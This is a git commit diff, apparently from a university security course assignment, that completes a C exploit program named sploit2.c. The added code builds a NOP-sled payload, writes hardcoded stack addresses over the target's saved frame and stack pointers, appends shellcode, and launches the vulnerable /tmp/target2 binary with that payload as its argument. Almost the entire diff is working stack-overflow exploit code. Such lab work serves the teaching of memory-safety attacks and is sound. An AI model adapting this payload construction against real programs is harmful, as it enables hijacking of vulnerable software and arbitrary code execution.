c6220b4bd5d74213df9405147a6859ca71342141
Wei Shi <weishi@stanford.edu>
2013-04-11 11:32:20 -0700

    Finished sploit2.c

--- sploits/sploit2.c
+++ sploits/sploit2.c
@@ -5,17 +5,36 @@
 #include "shellcode.h"
 
 #define TARGET "/tmp/target2"
+#define NULL_TERM 1
+#define PAYLOAD_SIZE (200+NULL_TERM)
+#define NOP (0x90)
+#define BUF_START (0xbffffc90)
+#define NEW_EBP (0xbffffd00)
+#define OFFSET ((NEW_EBP & 0xfff)-(BUF_START & 0xfff))
+#define NEW_ESP (0xbffffffa)
 
 int main(void)
 {
-  char *args[3];
-  char *env[1];
+    char *args[3];
+    char *env[1];
 
-  args[0] = TARGET; args[1] = "hi there"; args[2] = NULL;
-  env[0] = NULL;
+    char payload[PAYLOAD_SIZE];
 
-  if (0 > execve(TARGET, args, env))
-    fprintf(stderr, "execve failed.\n");
+    /* Build payload */
+    memset(payload, NOP, PAYLOAD_SIZE);
+    payload[PAYLOAD_SIZE-1] = '\0';
+    *(int *)(payload+OFFSET)=NEW_ESP;
+    *(int *)(payload+OFFSET+4)=NEW_EBP+4+4;
+    memcpy(payload+OFFSET+4+4, shellcode, strlen(shellcode));
 
-  return 0;
+
+    args[0] = TARGET;
+    args[1] = payload;
+    args[2] = NULL;
+    env[0] = NULL;
+
+    if (0 > execve(TARGET, args, env))
+        fprintf(stderr, "execve failed.\n");
+
+    return 0;
 }
